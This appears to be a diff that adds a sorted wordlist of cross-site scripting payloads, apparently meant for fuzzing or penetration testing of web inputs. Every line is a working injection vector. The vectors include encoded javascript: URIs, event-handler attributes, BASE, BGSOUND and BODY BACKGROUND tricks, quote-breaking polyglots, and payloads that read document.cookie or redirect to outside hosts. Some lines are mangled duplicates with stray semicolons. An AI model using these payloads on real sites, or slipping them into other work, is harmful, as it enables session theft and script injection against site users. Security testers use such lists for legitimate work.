+<;A HREF=";http://www.gohttp://www.google.com/ogle.com/";>;XSS<;/A>;
+<;A HREF=";http://www.google.com./";>;XSS<;/A>;
+<;A HREF=";h&#x0A;tt&#09;p://6&;#09;6.000146.0x7.147/";>;XSS<;/A>;
+<a href="jav&#65ascript:javascript:alert(1)">test1</a>
+<a href="jav&#97ascript:javascript:alert(1)">test1</a>
+<a href="java%0Ascript:al%0Aert()">click</a>
+<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>
+<a href=javas&#99;ript:alert(1)>
+<a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
+<a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
+<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
+<a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
+"<A HREF=""javascript:document.location='http://blog.zsec.uk/'"">XSS</A>"
+<;A HREF=";javascript:document.location=';http://www.google.com/';";>;XSS<;/A>;
+<a href="javascript#document.vulnerable=true;">
+"<a href=""javascript#document.write(""XSS-XSS-XSS"");"">"
+<a href="javascript:javascript:alert(1)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A">
+<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>
+<a href="javascript\x00:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript\x09:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript\x0A:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript\x0D:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript\x3A:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript\x3Ajavascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas\x00cript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas\x01cript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas\x02cript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas\x03cript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas\x04cript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas\x05cript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas\x06cript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas\x07cript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas\x08cript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas\x09cript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas\x0Acript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas\x0Bcript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas\x0Ccript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas\x0Dcript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="" onmousedown="var name = '&#39;;alert(1)//'; alert('smthg')">Link</a>
+<;A HREF=";//www.google.com/";>;XSS<;/A>;
+<a href="\xC2\xA0javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="\xE1\x9A\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+"/></a></><img src=1.gif onerror=alert(1)>
+‘)alert(1);//
+‘; alert(1);
+");alert`1337`;//1337
+‘; alert(document.cookie); var foo=’
+alert;pg("XSS")
+';alert(String&#46;fromCharCode(88,83,83))//\';alert(String&#46;fromCharCode(88,83,83))//\";alert(String&#46;fromCharCode(88,83,83))//\\";alert(String&#46;fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;\"&gt;'&gt;&lt;SCRIPT&gt;alert(String&#46;fromCharCode(88,83,83))&lt;/SCRIPT&gt;
+alert(String.fromCharCode(88,83,83));'))">
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";
+alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
+<"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></
+';;alert(String.fromCharCode(88,83,83))//\';;alert(String.fromCharCode(88,83,83))//";;alert(String.fromCharCode(88,83,83))//\";;alert(String.fromCharCode(88,83,83))//-->;<;/SCRIPT>;";>;';>;<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;
+';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT> 
+';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//;alert(String.fromCharCode(88,83,83))//\;alert(String.fromCharCode(88,83,83))//></SCRIPT>!--<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{}
+<"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+‘;alert(String.fromCharCode(88,83,83))//’;alert(String.fromCharCode(88,83,83))//”;alert(String.fromCharCode(88,83,83))//”;alert(String.fromCharCode(88,83,83))//–></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))<?/SCRIPT>&submit.x=27&submit.y=9&cmd=search
+"\"";alert('XSS');//"
+'); alert('XSS
+\";;alert(';XSS';);//
+\";alert('XSS');//
+\\";alert('XSS');//
+'); alert('xss'); var x='
+\\'); alert(\'xss\');var x=\'
+["');alert('XSS');//"]@xyz.xxx
+anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
+anythinglr00</script><script>alert(document.domain)</script>uxldz
+<a onmouseover="alert(document.cookie)">xxs link</a>
+<a onmouseover=alert(document.cookie)>xxs link</a>
+&apos;;alert(String.fromCharCode(88,83,83))//\&apos;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\&quot;;alert(String.fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;&quot;&gt;&apos;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;
+&apos;&apos;;!--&quot;&lt;XSS&gt;=&amp;{()}
+<applet onerror applet onerror="javascript:javascript:alert(1)"></applet onerror>
+<applet onError applet onError="javascript:javascript:alert(1)"></applet onError>
+<applet onreadystatechange applet onreadystatechange="javascript:javascript:alert(1)"></applet onreadystatechange>
+<applet onReadyStateChange applet onReadyStateChange="javascript:javascript:alert(1)"></applet onReadyStateChange>
+";a=prompt,a()//
+';a=prompt,a()//
+a=&quot;get&quot;;&amp;#10;b=&quot;URL(&quot;&quot;;&amp;#10;c=&quot;javascript:&quot;;&amp;#10;d=&quot;alert(&apos;XSS&apos;);&quot;)&quot;;&#10;eval(a+b+c+d);
+ascript:alert('WXSS');"">"
+"ascript:alert('XSS');"">"
+<a style="behavior:url(#default#AnchorClick);" folder="javascript:javascript:alert(1)">XXX</a>
+<a style="-o-link:'javascript:javascript:alert(1)';-o-link-source:current">X
+<a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="javascript:alert(1);">XXX</a></a><a href="javascript:javascript:alert(1)">XXX</a>
+<audio src=1 href=1 onerror="javascript:alert(1)"></audio>
+<audio src=1 onerror=alert(1)>
+"<BASE HREF=""javascript:alert('XSS');//"">"
+<;BASE HREF=";javascript:alert(';XSS';);//";>;
+<BASE HREF="javascript:alert('XSS');//">
+<base HREF="javascript:document.vulnerable=true;//">
+<BASE HREF="javascript:javascript:alert(1);//">
+%BCscript%BEalert(%A2XSS%A2)%BC/script%BE
+<bgsound onPropertyChange bgsound onPropertyChange="javascript:javascript:alert(1)"></bgsound onPropertyChange>
+"<BGSOUND SRC=""javascript:alert('XSS');"">"
+<;BGSOUND SRC=";javascript:alert(';XSS';);";>;
+<BGSOUND SRC="javascript:alert('XSS');">
+<bgsound src="javascript:document.vulnerable=true;">
+<bgsound SRC="javascript:document.vulnerable=true;">
+"<bgsound src=""javascript:document.write(""XSS-XSS-XSS"");"">"
+<BGSOUND SRC="javascript:javascript:alert(1);">
+[<blockquote cite="]">[" onmouseover="alert('RVRSH3LL_XSS');" ]
+</body>
+"><body%20onload%3Dalert(1)>
+"<BODY BACKGROUND=""javascript:alert('XSS')"">"
+<;BODY BACKGROUND=";javascript:alert(';XSS';);";>;
+<BODY BACKGROUND="javascript:alert('XSS')">
+<BODY BACKGROUND=”javascript:alert(‘XSS’)”>
+<body BACKGROUND="javascript:document.vulnerable=true;">
+<body background=javascript:'"><script>alert(navigator.userAgent)</script>></body>
+<body onbeforeunload body onbeforeunload="javascript:javascript:alert(1)"></body onbeforeunload>
+<body onBeforeUnload body onBeforeUnload="javascript:javascript:alert(1)"></body onBeforeUnload>
+<body onblur body onblur="javascript:javascript:alert(1)"></body onblur>
+<body onfocus body onfocus="javascript:javascript:alert(1)"></body onfocus>
+<body onFocus body onFocus="javascript:javascript:alert(1)"></body onFocus>
+<body oninput=javascript:alert(1)><input autofocus>
+<body onkeydown body onkeydown="javascript:javascript:alert(1)"></body onkeydown>
+<body onkeyup body onkeyup="javascript:javascript:alert(1)"></body onkeyup>
+";>;<;BODY onload!#$%&;()*~+-_.,:;?@[/|\]^`=alert(";XSS";)>;
+"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(""XSS"")>"
+"><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+<;BODY onload!#$%&;()*~+-_.,:;?@[/|\]^`=alert(";XSS";)>;
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+<body onload!#$%&()*~+-_.,:;?@[/|\]^`=document.vulnerable=true;>
+<BODY onload!#$%%&()*~+-_.,:;?@[/|\]^`=javascript:alert(1)>
+<BODY ONLOAD=alert('hellox worldss')>
+<body onLoad="alert('XSS');"
+<;BODY ONLOAD=alert(';XSS';)>;
+<BODY ONLOAD=alert("XSS")>
+<BODY ONLOAD=alert('XSS')>
+<BODY ONLOAD=alert(‘XSS’)>
+<BODY ONLOAD=alert(’XSS’)>
+<body onload body onload="javascript:javascript:alert(1)"></body onload>
+<body onLoad body onLoad="javascript:javascript:alert(1)"></body onLoad>
+<body onload="document.vulnerable=true;">
+<body ONLOAD=document.vulnerable=true;>
+"<body onload=""document.write(""XSS-XSS-XSS"");"">"
+<BODY ONLOAD=javascript:alert(1)>
+<BODY ONLOAD=javascript:javascript:alert(1)>
+<body/onload=&lt;!--&gt;&#10alert(1)>
+<body onLoad="while(true) alert('XSS');">
+<body onMouseEnter body onMouseEnter="javascript:javascript:alert(1)"></body onMouseEnter>
+<body onMouseMove body onMouseMove="javascript:javascript:alert(1)"></body onMouseMove>
+<body onMouseOver body onMouseOver="javascript:javascript:alert(1)"></body onMouseOver>
+<body onpagehide body onpagehide="javascript:javascript:alert(1)"></body onpagehide>
+<body onPageHide body onPageHide="javascript:javascript:alert(1)"></body onPageHide>
+<body onPageShow body onPageShow="javascript:javascript:alert(1)"></body onPageShow>
+<body onPopState body onPopState="javascript:javascript:alert(1)"></body onPopState>
+<body onPropertyChange body onPropertyChange="javascript:javascript:alert(1)"></body onPropertyChange>
+<body onResize body onResize="javascript:javascript:alert(1)"></body onResize>
+<body onscroll=alert(XSS)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
+<body onscroll=javascript:alert(1)><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
+<body onscroll=javascript:alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
+<body onunload body onunload="javascript:javascript:alert(1)"></body onunload>
+<body onUnload body onUnload="javascript:javascript:alert(1)"></body onUnload>
+<body onunload="javascript:alert('XSS');">
+<body src=1 href=1 onerror="javascript:alert(1)"></body>
+<;br size=\";&;{alert(&#039;XSS&#039;)}\";>;
+<br size=\"&{alert('XSS')}\">
+"<BR SIZE=""&{alert('XSS')}"">"
+<;BR SIZE=";&;{alert(';XSS';)}";>;
+<BR SIZE="&{alert('XSS')}">
+<br SIZE="&{document.vulnerable=true}">
+<BR SIZE="&{javascript:alert(1)}">
+</br style=a:expression(alert())>
+<;/br style=a:expression(alert())>;
+<b <script>alert(1)</script>0
+b=\"URL(\\"\";
+<button popovertarget=x>Click me</button>
